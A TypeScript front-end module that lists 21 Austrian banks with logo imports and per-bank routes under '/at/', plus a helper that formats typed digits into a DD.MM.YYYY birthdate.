import raiffeisenIcon from "@/assets/raiffeisen_bank.png";
import ersteIcon from "@/assets/erste_bank.png";
import bawagIcon from "@/assets/bawag_psk.png";
import bankAustriaIcon from "@/assets/bank_austria.png";
import volksbankIcon from "@/assets/volksbank.png";
import easyBankIcon from "@/assets/easy_bank.png";
import hypoNoeIcon from "@/assets/hypo_noe.png";
import oberbankIcon from "@/assets/oberbank.png";
import bank99Icon from "@/assets/bank99.png";
import schelhammerIcon from "@/assets/schelhammer.png";
import bankhausSpaenglerIcon from "@/assets/bankhaus_spaengler.png";
import dolomitenIcon from "@/assets/dolomiten_bank.png";
import spardaIcon from "@/assets/sparda_bank.png";
import dadatIcon from "@/assets/dadat_bank.png";
import marchfelderIcon from "@/assets/marchfelder_bank.png";
import btvVlbIcon from "@/assets/btv-vlb.png";
import burgenlandIcon from "@/assets/burgenland.jpg";
import bksIcon from "@/assets/bks.png";
import vkbIcon from "@/assets/vkb_bank.png";
import wuestenrotIcon from "@/assets/wuestenrot-icon.png";
import denizbankIcon from "@/assets/denizbank-icon.png";

export const banks = [
  { name: "Raiffeisen Bank", icon: raiffeisenIcon },
  { name: "Erste Bank", icon: ersteIcon },
  { name: "BAWAG P.S.K.", icon: bawagIcon },
  { name: "Bank Austria", icon: bankAustriaIcon },
  { name: "Volksbank", icon: volksbankIcon },
  { name: "Easy Bank", icon: easyBankIcon },
  { name: "HYPO NOE", icon: hypoNoeIcon },
  { name: "OberBank", icon: oberbankIcon },
  { name: "Bank99", icon: bank99Icon },
  { name: "Schelhammer", icon: schelhammerIcon },
  { name: "Bankhaus Spängler", icon: bankhausSpaenglerIcon },
  { name: "Dolomiten Bank", icon: dolomitenIcon },
  { name: "Sparda Bank", icon: spardaIcon },
  { name: "Dadat Bank", icon: dadatIcon },
  { name: "Marchfelder Bank", icon: marchfelderIcon },
  { name: "BTV Vier Länder Bank", icon: btvVlbIcon },
  { name: "Bank Burgenland", icon: burgenlandIcon },
  { name: "BKS Bank", icon: bksIcon },
  { name: "VKB Volkskreditbank", icon: vkbIcon },
  { name: "Wüstenrot", icon: wuestenrotIcon },
  { name: "DenizBank", icon: denizbankIcon },
];

export const bankRouteMap: Record<string, string> = {
  "Raiffeisen Bank": "/at/raiffeisenbank",
  "Erste Bank": "/at/erstebank",
  "BAWAG P.S.K.": "/at/bawag",
  "Bank Austria": "/at/bankaustria",
  "Volksbank": "/at/volksbank",
  "Easy Bank": "/at/easybank",
  "HYPO NOE": "/at/hyponoe",
  "OberBank": "/at/oberbank",
  "Bank99": "/at/bank99",
  "Schelhammer": "/at/schelhammer",
  "Bankhaus Spängler": "/at/bankhausspaengler",
  "Dolomiten Bank": "/at/dolomitenbank",
  "Sparda Bank": "/at/spardabank",
  "Dadat Bank": "/at/dadatbank",
  "Marchfelder Bank": "/at/marchfelderbank",
  "BTV Vier Länder Bank": "/at/btv",
  "Bank Burgenland": "/at/burgenland",
  "BKS Bank": "/at/bks",
  "VKB Volkskreditbank": "/at/vkb",
  "Wüstenrot": "/at/wuestenrot",
  "DenizBank": "/at/denizbank",
};

export function formatBirthdate(input: string): string {
  const d = input.replace(/\D/g, "").slice(0, 8);
  if (d.length === 0) return "";

  let day: string;
  let rest: string;
  if (d.length === 1) {
    if (d[0] === "0" || d[0] === "1" || d[0] === "2" || d[0] === "3") {
      return d;
    }
    day = "0" + d[0];
    rest = "";
  } else {
    day = d.slice(0, 2);
    rest = d.slice(2);
  }

  if (rest.length === 0) return day + ".";

  let month: string;
  let year: string;
  if (rest.length === 1) {
    if (rest[0] === "0" || rest[0] === "1") {
      return day + "." + rest[0];
    }
    month = "0" + rest[0];
    year = "";
  } else {
    month = rest.slice(0, 2);
    year = rest.slice(2);
  }

  if (year.length === 0) return day + "." + month + ".";
  return day + "." + month + "." + year;
}
